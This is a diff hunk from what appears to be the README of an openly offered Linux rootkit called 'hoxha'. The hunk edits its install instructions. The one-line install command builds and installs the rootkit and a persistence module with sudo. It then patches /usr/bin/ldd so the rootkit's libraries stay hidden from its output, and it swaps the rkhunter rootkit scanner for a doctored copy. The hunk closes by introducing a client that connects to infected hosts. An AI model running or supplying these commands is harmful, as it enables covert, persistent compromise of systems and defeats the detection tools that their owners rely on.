@@ -15,7 +15,7 @@ sed -i 's/python3/python/g' hoxha/persistance/libexec.c; sed -i 's/python3/pytho
 ```
 Considering SCTP is installed and loaded in the kernel, you can install the rootkit this:
 ```
-cd hoxha && make install clean && cd persistance && [ -f ./patchelf ] && chmod +x ./patchelf && make install clean && sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && cp ./rkhunter $(which rkhunter) 2>/dev/null
+cd hoxha && sudo make install clean && cd persistance && [ -f ./patchelf ] && chmod +x ./patchelf && sudo make install clean && sudo sed -i 's/try_trace \"$RTLD\" \"$file\" || result=1/try_trace \"$RTLD\" \"$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' /usr/bin/ldd && [ -f $(which rkhunter) ]  && sudo cp ./rkhunter $(which rkhunter) 2>/dev/null; cd -;
 ```
 The client can be used with just the destionation ip address where this rootkit is installed:
 ```
